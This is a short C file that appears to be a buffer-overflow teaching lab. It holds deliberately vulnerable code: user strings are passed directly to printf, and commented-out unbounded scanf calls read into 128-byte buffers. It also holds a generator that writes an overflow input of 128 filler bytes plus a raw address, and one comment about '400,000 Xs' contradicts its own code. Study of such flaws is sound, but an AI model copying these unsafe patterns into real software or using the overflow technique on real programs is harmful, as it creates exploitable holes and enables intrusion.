#include <stdio.h>

int match(char *s1, char *s2) {
  while (*s1 != '\0' && *s2 != 0 && *s1 == *s2) {
    s1++; s2++;
  }
  return (*s1 - *s2);
}

void welcome(char *str) {
  printf(str);
}

void goodbye(char *str) { 
  void exit(); 
  printf(str); 
  exit(1); 
}

void generateInput(long addr) {
  FILE *fp;
  int i = 0;
  if ((fp=fopen("input1","w")) == NULL) {
    fprintf(stderr,"Can't open %s.  Bye.\n","input1");
    exit(1);
  }
  for (i=0; i<128; i++) {  /* write 400,000 Xs with fprintf */
    if (fprintf(fp,"c") < 1) {
      fprintf(stderr,"Can't write. Bye\n");
      exit(1);
    }
  }
  if (fwrite(&addr, sizeof(char), 8, fp) < 8) {
    fprintf(stderr,"Can't write. Bye\n");
    exit(1);
  }
  if (fprintf(fp, "\nOwnz_U!") < 1) {
    fprintf(stderr,"Can't write. Bye\n");
    exit(1);
  }
  fclose(fp);
  //printf("%lx\n", addr);
}

main(){
  char name[128], pw[128]; /* passwords are eight characters - double this */
  char *good = "Welcome to The Machine!\n";
  char *evil = "Invalid identity, exiting!\n";

  //printf("login: "); scanf("%s", name);
  //printf("password: "); scanf("%s", pw);
  /*if (match(name, pw) == 0)
    welcome(good);
  else
  goodbye(evil);*/
  generateInput(pw);
}
	
